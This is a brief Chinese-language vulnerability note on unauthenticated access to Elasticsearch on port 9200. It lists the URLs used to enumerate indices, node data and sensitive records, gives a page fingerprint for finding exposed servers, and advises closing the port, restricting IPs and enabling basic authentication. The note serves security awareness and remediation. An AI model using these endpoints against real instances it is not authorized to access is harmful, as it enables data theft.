# Elasticsearch-未授权访问

## 漏洞描述


Elasticsearch是用Java开发的企业级搜索引擎，默认端口9200，存在未授权访问漏洞时，可被非法操作数据



## 漏洞影响


```plain
Elasticsearch
```



## 漏洞复现


访问目标URL : [http://xxx.xxx.xxx.xxx:9200/_node](http://xxx.xxx.xxx.xxx:9200/_node)



```plain
http://localhost:9200/_cat/indices
http://localhost:9200/_river/_search //查看数据库敏感信息
http://localhost:9200/_nodes         //查看节点数据
http://localhost:9200/_plugin/head/  //web管理界面(head插件)
```

未授权页面源码关键字：You Know,for Search



### 处置建议
1、9200端口不要对外开放，如需开放，建议在安全组限制只允许指定IP才能访问9200端口；

2、在config/elasticsearch.yml中为9200端口设置认证，相关配置参数可参考：

http.basic.enabled true #启动认证，开启会接管全部HTTP连接

http.basic.user "admin" #配置认证账号

http.basic.password "admin_pw" #配置认证密码

http.basic.ipwhitelist ["localhost", "127.0.0.1"]
